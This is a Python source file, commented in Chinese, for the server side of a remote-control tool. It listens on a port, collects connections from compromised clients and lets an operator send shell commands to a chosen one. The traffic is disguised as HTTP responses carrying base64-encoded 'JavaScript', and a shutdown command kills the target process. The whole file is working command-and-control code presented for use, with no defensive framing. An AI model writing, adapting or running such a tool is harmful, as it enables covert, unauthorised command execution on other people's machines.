# -*- coding: utf-8 -*-
import base64
import socket
import argparse
import time
import threading

# 线程锁
lock = threading.Lock()
# 连接的客户端列表
clientList = []
# 当前的客户端
curClient = None

def encryption_res(data):
    # 可以采用任何加密或编码方式
    data = base64.b64encode(data).decode()
    # 对时间进行处理
    date = time.strftime('%a, %d %b %Y %X GMT', time.localtime(time.time()))

    sendData = "HTTP/1.1 200 OK"
    sendData += "\r\n"
    sendData += "Date: %s" % date
    sendData += "\r\n"
    sendData += "Content-Type: application/x-javascript"
    sendData += "\r\n"
    sendData += "Content-Length: %d" % len(data)
    sendData += "\r\n"
    sendData += "Connection: keep-alive"
    sendData += "\r\n"
    sendData += "\r\n"
    sendData += "%s" % data
    return sendData.encode()

def decryption_req(data):
    data = data.decode()
    data = data[data.find("\r\n\r\nstri0date=") + 14:]
    data = data[:data.find("\r\n\r\n")]
    data = base64.b64decode(data)
    return data


# 等待连接
def wait_connect(s):
    while True:
        ss, addr = s.accept()
        print('client %s is connection!' % (addr[0]))
        lock.acquire()
        clientList.append((ss, addr))
        lock.release()

# 命令执行
def exec_cmd():
    ss = curClient[0]
    addr = curClient[1]
    print("当前客户端：", addr[0])
    print("print:'\\!q' for Exit the current client Or print:'\\!shutdown' for Kill the target process")
    while True:
        cmd = input(str(addr[0]) + ':#')
        if cmd == '\\!q':
            print('-- Exit --')
            break
        elif cmd == '\\!shutdown':
            print('Are you sure you\'re killing the target process? (Y/N)')
            tmp_cmd = input('>')
            if tmp_cmd.upper() == 'Y':
                clientList.remove(curClient)
                ss.send(encryption_res(cmd.encode()))
                time.sleep(1)
                ss.close()
                print("Terminated target process.\r\n已终止目标进程。")
                break
            else:
                continue
        ss.send(encryption_res(cmd.encode()))
        data = ss.recv(8192)
        print(decryption_req(data).decode(), end='')

if __name__ == '__main__':
    # 命令行参数解析对象
    parser = argparse.ArgumentParser()
    parser.add_argument('-host', dest='hostName', default='0.0.0.0', help='Host Name(default=0.0.0.0)')
    parser.add_argument('-port', dest='conPort', type=int, default=1234, help='Host Port(default=1234)')
    # 解析命令行参数
    args = parser.parse_args()
    host = args.hostName
    port = args.conPort

    if host == None or port == None:
        print(parser.parse_args(['-h']))
        exit(0)
    else:
        print("Listening: %s:%s" % (host, port))
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((host, port))
    s.listen(512)
    t = threading.Thread(target=wait_connect, args=(s, ))
    t.start()

    printWait_flag = True
    while True:
        if len(clientList) == 0:
            if printWait_flag:
                print('Waiting for connection......')
                printWait_flag = False
            time.sleep(1)
            continue
        else:
            printWait_flag = True

        # 选择客户端
        while True:
            for i in range(len(clientList)):
                print('[%i] > %s' % (i, str(clientList[i][1][0])))
            print("print:'\\q' for stop server Or print:'Refresh' for Refresh Client List")
            print('Please select a client!')
            num = input('client num:')
            if num == '\\q':
                print('Service stop')
                s.close()
                exit(0)
            elif num == 'Refresh':
                continue
            if not num.isdigit():
                print('Not a numeric type! please try again.')
                continue
            elif int(num) >= len(clientList) or int(num) < 0:
                print('Please input a correct num!')
                continue
            else:
                curClient = clientList[int(num)]
                break
        try:
            # 执行命令
            exec_cmd()
        except Exception as e:
            clientList.remove(curClient)
            print(e)
